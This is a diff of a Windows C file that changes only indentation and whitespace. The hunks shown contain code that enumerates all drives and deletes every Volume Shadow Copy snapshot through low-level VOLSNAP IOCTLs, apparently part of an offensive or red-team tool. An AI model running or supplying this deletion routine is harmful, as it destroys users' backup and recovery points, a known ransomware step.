@@ -55,8 +55,8 @@ typedef struct _VS_VOLSNAP_NAME
 static HANDLE OpenVolumeHandle(IN LPCWSTR pwszBackedVol, IN BOOL bQueryVolumeFlags)
 {
     DWORD   dwDesiredAccess         = (bQueryVolumeFlags ? (GENERIC_READ) : (FILE_GENERIC_READ | FILE_GENERIC_WRITE));
-	DWORD   dwShareMode             = (bQueryVolumeFlags ? (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) : (FILE_SHARE_READ | FILE_SHARE_WRITE));
-	DWORD   dwFlagsAndAttributes    = (bQueryVolumeFlags ? (FILE_FLAG_BACKUP_SEMANTICS) : (FILE_ATTRIBUTE_NORMAL));
+    DWORD   dwShareMode             = (bQueryVolumeFlags ? (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) : (FILE_SHARE_READ | FILE_SHARE_WRITE));
+    DWORD   dwFlagsAndAttributes    = (bQueryVolumeFlags ? (FILE_FLAG_BACKUP_SEMANTICS) : (FILE_ATTRIBUTE_NORMAL));
     HANDLE  hVolume                 = INVALID_HANDLE_VALUE;
     
     hVolume = CreateFileW(
@@ -100,7 +100,7 @@ BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSna
     if ((hVolume = OpenVolumeHandle(pwszBackedVol, TRUE)) == INVALID_HANDLE_VALUE)
         goto _FUNC_CLEANUP;
 
-	// Fetch the size of the buffer required to hold the snapshot names
+    // Fetch the size of the buffer required to hold the snapshot names
     if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_QUERY_NAMES_OF_SNAPSHOTS, NULL, 0, &uBytesRequired, sizeof(uBytesRequired), &dwBytesReturned, NULL))
     {
         dwLastError = GetLastError();
@@ -108,7 +108,7 @@ BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSna
 
     if (dwLastError == ERROR_INVALID_PARAMETER || (dwLastError == ERROR_SUCCESS && uBytesRequired == 0x00))
     {
-		printf("[-] No Shadow Copies Found For Volume: %ws \n", pwszBackedVol);
+	printf("[-] No Shadow Copies Found For Volume: %ws \n", pwszBackedVol);
         bResult = TRUE;
         goto _FUNC_CLEANUP;
     }
@@ -128,12 +128,12 @@ BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSna
     {
         printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
         goto _FUNC_CLEANUP;
-	}
+    }
 
-	// Stop writes to the volume
+    // Stop writes to the volume
     DeviceIoControl(hVolume, IOCTL_VOLSNAP_FLUSH_AND_HOLD_WRITES, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
 
-	// Fetch the snapshot names
+    // Fetch the snapshot names
     if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_QUERY_NAMES_OF_SNAPSHOTS, NULL, 0, lpBuffer, (DWORD)cbTotalBytesRequired, &dwBytesReturned, NULL))
     {
         printf("[!] DeviceIoControl [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
@@ -153,11 +153,11 @@ BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSna
     if (!*pdwSnapCount) 
     {
         printf("[-] No Shadow Copies Found For Volume: %ws \n", pwszBackedVol);
-		bResult = TRUE;
+	bResult = TRUE;
         goto _FUNC_CLEANUP;
     }
     
-	// Allocate the array of pointers for snapshot names
+    // Allocate the array of pointers for snapshot names
     if (!(ppwszNames = (LPWSTR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwSnapCount * sizeof(LPWSTR))))
     {
         printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
@@ -166,7 +166,7 @@ BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSna
 
     pwszIter = pVolsnapNames->awcNames;
 
-	// Copy the snapshot names into the allocated array
+   // Copy the snapshot names into the allocated array
     for (unsigned int i = 0; i < *pdwSnapCount; ++i)
     {
         DWORD dwStringLength = lstrlenW(pwszIter) + 1;
@@ -175,7 +175,7 @@ BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSna
         {
             printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
             *pdwSnapCount = i;
-			break;
+	    break;
         }
        
         wcsncpy_s(ppwszNames[i], dwStringLength, pwszIter, _TRUNCATE);
@@ -239,7 +239,7 @@ BOOL DeleteShadowCopyViaIoctl(IN LPCWSTR pwszBackedVol, IN LPCWSTR pwszSnapDevic
     if (!(pVolsnapDelete = (PVS_VOLSNAP_NAME)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VS_VOLSNAP_NAME) + (lstrlenW(pwszSnapDevice) * sizeof(WCHAR)) + sizeof(WCHAR))))
     {
         printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
-		return FALSE;
+	return FALSE;
     }
 
     pVolsnapDelete->uNameLength = (USHORT)(lstrlenW(pwszSnapDevice) * sizeof(WCHAR));
@@ -251,7 +251,7 @@ BOOL DeleteShadowCopyViaIoctl(IN LPCWSTR pwszBackedVol, IN LPCWSTR pwszSnapDevic
 
     if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_DELETE_SNAPSHOT, pVolsnapDelete, pVolsnapDelete->uNameLength + sizeof(USHORT), NULL, 0x00, &dwBytesReturned, NULL))
     {
-		printf("[!] DeviceIoControl [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
+	printf("[!] DeviceIoControl [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
         goto _END_OF_FUNC;
     }
 
@@ -268,18 +268,18 @@ _END_OF_FUNC:
 
 BOOL EnumerateShadowCopiesViaIoctlAndDelete(OUT OPTIONAL PDWORD pdwNumberOfSnapshotsDeleted)
 {
-    DWORD						dwNumberOfDrives		= 0x00,
-                                dwQueriedSnapshots      = 0x00;
-    LPWSTR*                     ppwszSnapshotNames      = NULL;
-	WCHAR						szDrives[MAX_PATH]		= { 0 };
-	WCHAR						szVolumePath[0x10]		= { 0 };
-	WCHAR*						pszDrive				= NULL;
+    DWORD			dwNumberOfDrives		= 0x00,
+                                dwQueriedSnapshots      	= 0x00;
+    LPWSTR*                     ppwszSnapshotNames      	= NULL;
+    WCHAR			szDrives[MAX_PATH]		= { 0 };
+    WCHAR			szVolumePath[0x10]		= { 0 };
+    WCHAR*			pszDrive			= NULL;
 
     if (pdwNumberOfSnapshotsDeleted) *pdwNumberOfSnapshotsDeleted = 0x00;
 
     if ((dwNumberOfDrives = GetLogicalDriveStringsW(MAX_PATH, szDrives)) == 0x00) {
         printf("[!] GetLogicalDriveStringsW Failed With Error: %ld \n", GetLastError());
-		return FALSE;
+	return FALSE;
     }
 
     pszDrive = szDrives;
@@ -326,5 +326,4 @@ int main(void)
 
     return 0;
 }
-
 
